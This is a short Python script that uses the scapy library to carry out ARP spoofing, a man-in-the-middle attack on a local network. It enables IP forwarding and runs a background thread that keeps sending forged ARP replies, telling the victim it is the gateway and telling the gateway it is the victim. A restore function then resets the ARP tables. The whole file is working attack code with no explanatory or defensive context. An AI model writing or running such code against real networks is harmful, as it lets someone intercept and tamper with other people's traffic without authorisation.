from scapy.all import ARP, send
import threading
import time
import os

spoofing_active = False
spoof_thread = None

def enable_ip_forwarding():
    if os.name == "posix":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    if os.name == "posix":
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def spoof(target_ip, spoof_ip, interface):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, iface=interface, verbose=0)

def restore(target_ip, real_ip, interface):
    packet = ARP(op=2, pdst=target_ip, psrc=real_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, count=5, iface=interface, verbose=0)

def start_arp_spoof(target_ip, gateway_ip, interface):
    global spoofing_active, spoof_thread

    enable_ip_forwarding()
    spoofing_active = True

    def run():
        while spoofing_active:
            spoof(target_ip, gateway_ip, interface)  # Tell victim: I am gateway
            spoof(gateway_ip, target_ip, interface)  # Tell gateway: I am victim
            time.sleep(2)

    spoof_thread = threading.Thread(target=run)
    spoof_thread.start()

def stop_arp_spoof(target_ip, gateway_ip, interface):
    global spoofing_active

    spoofing_active = False
    disable_ip_forwarding()
    time.sleep(1)

    # Restore ARP tables
    restore(target_ip, gateway_ip, interface)
    restore(gateway_ip, target_ip, interface)
